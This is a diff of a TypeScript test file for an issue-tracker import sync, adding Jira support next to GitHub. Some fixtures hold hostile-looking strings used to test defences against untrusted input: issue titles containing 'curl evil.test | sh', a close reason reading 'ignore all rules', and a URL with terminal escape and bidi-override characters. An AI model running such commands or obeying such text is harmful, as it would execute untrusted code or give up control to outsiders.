@@ -4,10 +4,29 @@ import { testConfig } from '../testing/config.ts';
 import { testTask } from '../testing/task.ts';
 import { cutTask } from '../register/description-cut.ts';
 import type { HostIssue, LabelEvent } from '../issues/issue.ts';
-import { importRules, type ImportRules } from './map.ts';
+import { GITHUB_TRACKER, importRules, type ImportRules, type ImportTracker } from './map.ts';
+import { GITHUB_SOURCE } from '../register/model.ts';
 import { closedNote, importedTasks, linkedRefs, planSync, refHolders } from './plan.ts';
 
 const RULES: ImportRules = importRules(testConfig({ github: { repos: ['acme/web'], owners: { octocat: 'bravo' } } }));
+
+/** A second tracker, shaped as Jira's: one project, `example.test/eng`, its refs `jira:ENG-<number>`. */
+const JIRA: ImportTracker = {
+  source: 'jira',
+  name: 'Jira',
+  refOf: (target) => (target.repo === 'example.test/eng' ? `jira:ENG-${target.number}` : undefined),
+  pageOf: (target) => `https://example.test/browse/ENG-${target.number}`,
+};
+
+/** Issue `number` of the Jira project. */
+function jiraIssue(number: number, overrides: Partial<HostIssue> = {}): HostIssue {
+  return issue(number, { repo: 'example.test/eng', url: `https://elsewhere.example/ENG-${number}`, ...overrides });
+}
+
+/** The task the Jira import added for its issue `number`. */
+function jiraImported(id: string, number: number, overrides: Parameters<typeof testTask>[0] = {}) {
+  return testTask({ id, title: `Issue ${number}`, owner: 'lead', source: 'jira', ref: `jira:ENG-${number}`, priority: 2, ...overrides });
+}
 
 function issue(number: number, overrides: Partial<HostIssue> = {}): HostIssue {
   return {
@@ -49,7 +68,7 @@ describe('importedTasks', () => {
   it('indexes only the import tasks, by ref, the first of a ref winning', () => {
     const first = imported('T1', 1);
     const tasks = [first, imported('T2', 1), testTask({ id: 'T3', ref: 'gh:acme/web#3' }), imported('T4', 4, { ref: null })];
-    assert.deepEqual([...importedTasks(tasks)], [['gh:acme/web#1', first]]);
+    assert.deepEqual([...importedTasks(tasks, GITHUB_SOURCE)], [['gh:acme/web#1', first]]);
   });
 });
 
@@ -81,7 +100,7 @@ describe('linkedRefs', () => {
 
 describe('planSync', () => {
   it('adds an open issue with no task, and never a closed one', () => {
-    const plan = planSync([issue(7, { labels: ['p1'], assignees: ['octocat'] }), issue(8, { state: 'closed' })], new Map(), RULES);
+    const plan = planSync([issue(7, { labels: ['p1'], assignees: ['octocat'] }), issue(8, { state: 'closed' })], new Map(), RULES, GITHUB_TRACKER);
     assert.deepEqual(plan, {
       steps: [{ kind: 'add', ref: 'gh:acme/web#7', input: { title: 'Issue 7', description: null, owner: 'bravo', ref: 'gh:acme/web#7', priority: 1 } }],
       inserted: 1,
@@ -93,18 +112,18 @@ describe('planSync', () => {
 
   it('writes nothing for an issue a team task links to, open or closed, and counts it as known', () => {
     const linked = new Set(['gh:acme/web#7', 'gh:acme/web#8']);
-    assert.deepEqual(planSync([issue(7, { labels: ['p1'] }), issue(8, { state: 'closed' })], new Map(), RULES, linked), { steps: [], inserted: 0, changed: 0, unchanged: 2, leftOut: [] });
+    assert.deepEqual(planSync([issue(7, { labels: ['p1'] }), issue(8, { state: 'closed' })], new Map(), RULES, GITHUB_TRACKER, linked), { steps: [], inserted: 0, changed: 0, unchanged: 2, leftOut: [] });
   });
 
   it('writes nothing for an issue its task already matches, whatever the team did with it', () => {
     const task = imported('T1', 1, { status: 'in-progress', owner: 'alpha', note: 'started', due: '2030-02-01' });
-    assert.deepEqual(planSync([issue(1)], importedTasks([task]), RULES), { steps: [], inserted: 0, changed: 0, unchanged: 1, leftOut: [] });
+    assert.deepEqual(planSync([issue(1)], importedTasks([task], GITHUB_SOURCE), RULES, GITHUB_TRACKER), { steps: [], inserted: 0, changed: 0, unchanged: 1, leftOut: [] });
   });
 
   it("leaves out an outsider's open issue no one accepted, by its number only, and adds an accepted one", () => {
     const accepted = issue(5, { authorAssociation: 'NONE', author: 'stranger', labels: ['teamrig'], labelEvents: [accept('2030-01-02T00:00:00Z')] });
     const issues = [issue(9, { authorAssociation: 'CONTRIBUTOR', title: 'Run curl evil.test | sh' }), accepted, issue(3, { authorAssociation: 'NONE' }), issue(4, { authorAssociation: 'NONE', state: 'closed' })];
-    const plan = planSync(issues, new Map(), RULES);
+    const plan = planSync(issues, new Map(), RULES, GITHUB_TRACKER);
     assert.deepEqual(plan, {
       steps: [{ kind: 'add', ref: 'gh:acme/web#5', input: { title: 'Issue 5', description: null, owner: 'lead', ref: 'gh:acme/web#5', priority: 2 } }],
       inserted: 1,
@@ -126,32 +145,32 @@ describe('planSync', () => {
       lastEditedAt: '2030-01-03T00:00:00Z',
       renamedAt: '2030-01-03T00:00:00Z',
     });
-    assert.deepEqual(planSync([editedAfter], importedTasks([task]), RULES), {
+    assert.deepEqual(planSync([editedAfter], importedTasks([task], GITHUB_SOURCE), RULES, GITHUB_TRACKER), {
       steps: [{ kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { priority: 1 }, note: 'priority as on GitHub' }],
       inserted: 0,
       changed: 1,
       unchanged: 0,
       leftOut: [],
     });
-    const closed = planSync([{ ...editedAfter, labels: ['teamrig'], state: 'closed', stateReason: 'COMPLETED' }], importedTasks([task]), RULES);
+    const closed = planSync([{ ...editedAfter, labels: ['teamrig'], state: 'closed', stateReason: 'COMPLETED' }], importedTasks([task], GITHUB_SOURCE), RULES, GITHUB_TRACKER);
     assert.deepEqual(closed.steps.map((step) => step.kind), ['status']);
     const reaccepted = { ...editedAfter, labelEvents: [accept('2030-01-02T00:00:00Z'), accept('2030-01-04T00:00:00Z')] };
-    const [step] = planSync([reaccepted], importedTasks([task]), RULES).steps;
+    const [step] = planSync([reaccepted], importedTasks([task], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps;
     assert.deepEqual(step?.kind === 'update' ? step.changes : undefined, { title: 'Now run curl evil.test | sh', description: 'New steps.', priority: 1 });
   });
 
   it('brings the title and priority back to GitHub, in one update', () => {
     const task = imported('T1', 1, { title: 'Renamed here', priority: 4 });
-    assert.deepEqual(planSync([issue(1, { labels: ['p3'] })], importedTasks([task]), RULES).steps, [
+    assert.deepEqual(planSync([issue(1, { labels: ['p3'] })], importedTasks([task], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps, [
       { kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { title: 'Issue 1', priority: 3 }, note: 'title and priority as on GitHub' },
     ]);
   });
 
   it('adds an issue with its body as the description, and brings an edited or emptied body back, counted as changed', () => {
-    const added = planSync([issue(7, { body: 'Steps:\n1. log in' })], new Map(), RULES).steps;
+    const added = planSync([issue(7, { body: 'Steps:\n1. log in' })], new Map(), RULES, GITHUB_TRACKER).steps;
     assert.deepEqual(added, [{ kind: 'add', ref: 'gh:acme/web#7', input: { title: 'Issue 7', description: 'Steps:\n1. log in', owner: 'lead', ref: 'gh:acme/web#7', priority: 2 } }]);
     const described = imported('T1', 1, { description: 'Old steps.' });
-    const edited = planSync([issue(1, { body: 'New steps.' })], importedTasks([described]), RULES);
+    const edited = planSync([issue(1, { body: 'New steps.' })], importedTasks([described], GITHUB_SOURCE), RULES, GITHUB_TRACKER);
     assert.deepEqual(edited, {
       steps: [{ kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { description: 'New steps.' }, note: 'description as on GitHub' }],
       inserted: 0,
@@ -159,30 +178,30 @@ describe('planSync', () => {
       unchanged: 0,
       leftOut: [],
     });
-    assert.deepEqual(planSync([issue(1)], importedTasks([described]), RULES).steps, [
+    assert.deepEqual(planSync([issue(1)], importedTasks([described], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps, [
       { kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { description: null }, note: 'description as on GitHub' },
     ]);
     const all = imported('T1', 1, { title: 'Renamed here', priority: 4 });
-    const [step] = planSync([issue(1, { body: 'Why.', labels: ['p3'] })], importedTasks([all]), RULES).steps;
+    const [step] = planSync([issue(1, { body: 'Why.', labels: ['p3'] })], importedTasks([all], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps;
     assert.equal(step?.kind === 'update' ? step.note : undefined, 'title, description and priority as on GitHub');
-    assert.deepEqual(planSync([issue(1, { body: 'Old steps.' })], importedTasks([described]), RULES).unchanged, 1);
+    assert.deepEqual(planSync([issue(1, { body: 'Old steps.' })], importedTasks([described], GITHUB_SOURCE), RULES, GITHUB_TRACKER).unchanged, 1);
   });
 
   it('judges a task whose line left the description out by its mark: the same body writes nothing, an edit of the same length is written', () => {
     const cut = cutTask(imported('T1', 1, { description: 'Now with steps.' }));
     assert.equal(cut.description, null);
-    assert.deepEqual(planSync([issue(1, { body: 'Now with steps.' })], importedTasks([cut]), RULES), { steps: [], inserted: 0, changed: 0, unchanged: 1, leftOut: [] });
-    assert.deepEqual(planSync([issue(1, { body: 'Now with stops.' })], importedTasks([cut]), RULES).steps, [
+    assert.deepEqual(planSync([issue(1, { body: 'Now with steps.' })], importedTasks([cut], GITHUB_SOURCE), RULES, GITHUB_TRACKER), { steps: [], inserted: 0, changed: 0, unchanged: 1, leftOut: [] });
+    assert.deepEqual(planSync([issue(1, { body: 'Now with stops.' })], importedTasks([cut], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps, [
       { kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { description: 'Now with stops.' }, note: 'description as on GitHub' },
     ]);
-    assert.deepEqual(planSync([issue(1)], importedTasks([cut]), RULES).steps, [
+    assert.deepEqual(planSync([issue(1)], importedTasks([cut], GITHUB_SOURCE), RULES, GITHUB_TRACKER).steps, [
       { kind: 'update', ref: 'gh:acme/web#1', id: 'T1', changes: { description: null }, note: 'description as on GitHub' },
     ]);
   });
 
   it("writes the issue's page as teamrig builds it for evidence, never the address the API sent", () => {
     for (const url of ['https://github.com/acme/web/issues/1\u001b[2J‮', 'https://elsewhere.example/acme/web/issues/1', 'https://github.com/acme/web/issues/1?then=text']) {
-      const plan = planSync([issue(1, { state: 'closed', stateReason: 'COMPLETED', url })], importedTasks([imported('T1', 1)]), RULES);
+      const plan = planSync([issue(1, { state: 'closed', stateReason: 'COMPLETED', url })], importedTasks([imported('T1', 1)], GITHUB_SOURCE), RULES, GITHUB_TRACKER);
       assert.deepEqual(plan.steps, [
         { kind: 'status', ref: 'gh:acme/web#1', id: 'T1', input: { status: 'done', note: 'closed on GitHub as completed', evidence: 'https://github.com/acme/web/issues/1' } },
       ]);
@@ -190,14 +209,14 @@ describe('planSync', () => {
   });
 
   it('finishes, drops or reopens a task as its issue closes or reopens', () => {
-    const tasks = importedTasks([imported('T1', 1, { status: 'waiting' }), imported('T2', 2), imported('T3', 3, { status: 'done' }), imported('T4', 4, { status: 'dropped' })]);
+    const tasks = importedTasks([imported('T1', 1, { status: 'waiting' }), imported('T2', 2), imported('T3', 3, { status: 'done' }), imported('T4', 4, { status: 'dropped' })], GITHUB_SOURCE);
     const issues = [
       issue(1, { state: 'closed', stateReason: 'COMPLETED' }),
       issue(2, { state: 'closed', stateReason: 'NOT_PLANNED' }),
       issue(3, { updatedAt: '2030-01-07T09:30:00Z' }),
       issue(4, { state: 'closed', stateReason: 'DUPLICATE' }),
     ];
-    assert.deepEqual(planSync(issues, tasks, RULES), {
+    assert.deepEqual(planSync(issues, tasks, RULES, GITHUB_TRACKER), {
       steps: [
         { kind: 'status', ref: 'gh:acme/web#1', id: 'T1', input: { status: 'done', note: 'closed on GitHub as completed', evidence: 'https://github.com/acme/web/issues/1' } },
         { kind: 'status', ref: 'gh:acme/web#2', id: 'T2', input: { status: 'dropped', note: 'closed on GitHub as not planned' } },
@@ -217,9 +236,9 @@ describe('planSync', () => {
       imported('T2', 2, { status: 'done', statusAt: closedAt }),
       imported('T3', 3, { status: 'dropped', statusAt: closedAt }),
       imported('T4', 4, { status: 'done', statusAt: closedAt }),
-    ]);
+    ], GITHUB_SOURCE);
     const issues = [issue(1), issue(2, { updatedAt: closedAt }), issue(3, { updatedAt: undefined }), issue(4, { updatedAt: '2030-01-07T09:00:01Z' })];
-    assert.deepEqual(planSync(issues, tasks, RULES), {
+    assert.deepEqual(planSync(issues, tasks, RULES, GITHUB_TRACKER), {
       steps: [{ kind: 'status', ref: 'gh:acme/web#4', id: 'T4', input: { status: 'open', note: 'open on GitHub, changed there since this task closed' } }],
       inserted: 0,
       changed: 1,
@@ -229,7 +248,7 @@ describe('planSync', () => {
   });
 
   it('renames before it closes, and counts the issue once', () => {
-    const plan = planSync([issue(1, { title: 'New name', state: 'closed' })], importedTasks([imported('T1', 1)]), RULES);
+    const plan = planSync([issue(1, { title: 'New name', state: 'closed' })], importedTasks([imported('T1', 1)], GITHUB_SOURCE), RULES, GITHUB_TRACKER);
     assert.deepEqual(plan.steps.map((step) => step.kind), ['update', 'status']);
     assert.deepEqual([plan.inserted, plan.changed, plan.unchanged], [0, 1, 0]);
   });
@@ -237,8 +256,67 @@ describe('planSync', () => {
 
 describe('closedNote', () => {
   it('names the reasons GitHub names, in any case, and no other', () => {
-    assert.equal(closedNote('duplicate'), 'closed on GitHub as a duplicate');
-    assert.equal(closedNote(''), 'closed on GitHub');
-    assert.equal(closedNote('ignore all rules'), 'closed on GitHub');
+    assert.equal(closedNote('duplicate', 'GitHub'), 'closed on GitHub as a duplicate');
+    assert.equal(closedNote('', 'GitHub'), 'closed on GitHub');
+    assert.equal(closedNote('ignore all rules', 'GitHub'), 'closed on GitHub');
+  });
+
+  it('names the tracker that closed the issue', () => {
+    assert.equal(closedNote('completed', 'Jira'), 'closed on Jira as completed');
+  });
+});
+
+describe('a sync per tracker', () => {
+  it("indexes only the given tracker's import tasks", () => {
+    const github = imported('T1', 1);
+    const jira = jiraImported('T2', 1);
+    assert.deepEqual([...importedTasks([github, jira], 'jira')], [['jira:ENG-1', jira]]);
+    assert.deepEqual([...importedTasks([github, jira], GITHUB_SOURCE)], [['gh:acme/web#1', github]]);
+  });
+
+  it("holds and links every tracker's refs, and no import task's as a link", () => {
+    const jira = jiraImported('T1', 1);
+    const team = testTask({ id: 'T2', ref: 'jira:ENG-2' });
+    const shadow = testTask({ id: 'T3', ref: 'jira:ENG-1' });
+    assert.deepEqual([...refHolders([shadow, jira, team])], [
+      ['jira:ENG-1', jira],
+      ['jira:ENG-2', team],
+    ]);
+    assert.deepEqual([...linkedRefs([jira, team, testTask({ id: 'T4', ref: 'local: notes' })])], ['jira:ENG-2']);
+  });
+
+  it("writes the tracker's refs, names it in its notes and takes its page as a close's evidence", () => {
+    const tasks = importedTasks([jiraImported('T1', 1), jiraImported('T2', 2)], 'jira');
+    const plan = planSync([jiraIssue(1, { title: 'Renamed' }), jiraIssue(2, { state: 'closed', stateReason: 'COMPLETED' }), jiraIssue(3)], tasks, RULES, JIRA);
+    assert.deepEqual(plan.steps, [
+      { kind: 'update', ref: 'jira:ENG-1', id: 'T1', changes: { title: 'Renamed' }, note: 'title as on Jira' },
+      { kind: 'status', ref: 'jira:ENG-2', id: 'T2', input: { status: 'done', note: 'closed on Jira as completed', evidence: 'https://example.test/browse/ENG-2' } },
+      { kind: 'add', ref: 'jira:ENG-3', input: { title: 'Issue 3', description: null, owner: 'lead', ref: 'jira:ENG-3', priority: 2 } },
+    ]);
+  });
+
+  it('closes a task with no evidence when the tracker gives its issue no page', () => {
+    const pageless: ImportTracker = { ...JIRA, pageOf: () => undefined };
+    const tasks = importedTasks([jiraImported('T1', 1)], 'jira');
+    assert.deepEqual(planSync([jiraIssue(1, { state: 'closed', stateReason: 'COMPLETED' })], tasks, RULES, pageless).steps, [
+      { kind: 'status', ref: 'jira:ENG-1', id: 'T1', input: { status: 'done', note: 'closed on Jira as completed' } },
+    ]);
+  });
+
+  it("neither writes nor counts an issue at a place the tracker's config does not name", () => {
+    assert.deepEqual(planSync([issue(1), jiraIssue(2)], new Map(), RULES, JIRA), {
+      steps: [{ kind: 'add', ref: 'jira:ENG-2', input: { title: 'Issue 2', description: null, owner: 'lead', ref: 'jira:ENG-2', priority: 2 } }],
+      inserted: 1,
+      changed: 0,
+      unchanged: 0,
+      leftOut: [],
+    });
+  });
+
+  it('reopens a closed task naming the tracker that changed its issue', () => {
+    const tasks = importedTasks([jiraImported('T1', 1, { status: 'done', statusAt: '2030-01-01T00:00:00.000Z' })], 'jira');
+    assert.deepEqual(planSync([jiraIssue(1, { updatedAt: '2030-01-02T00:00:00Z' })], tasks, RULES, JIRA).steps, [
+      { kind: 'status', ref: 'jira:ENG-1', id: 'T1', input: { status: 'open', note: 'open on Jira, changed there since this task closed' } },
+    ]);
   });
 });
